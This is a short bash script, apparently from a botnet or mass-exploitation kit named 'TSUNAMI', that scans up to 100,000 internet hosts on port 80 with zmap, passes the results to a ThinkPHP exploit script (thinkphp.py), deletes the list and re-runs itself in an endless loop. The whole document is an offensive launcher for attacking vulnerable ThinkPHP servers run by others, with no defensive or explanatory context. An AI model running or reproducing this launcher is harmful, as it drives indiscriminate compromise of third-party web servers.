#!/bin/bash
clear
echo -e "\e[1;97m[\e[1;36mTSUNAMI\e[1;97m] \e[1;36mNow Auto-Scanning ThinkPHP"
zmap -p80 -o list.txt -B100M -N 100000
ulimit -n 999999
python thinkphp.py list.txt
rm -rf list.txt
clear
sh thinkphp.sh
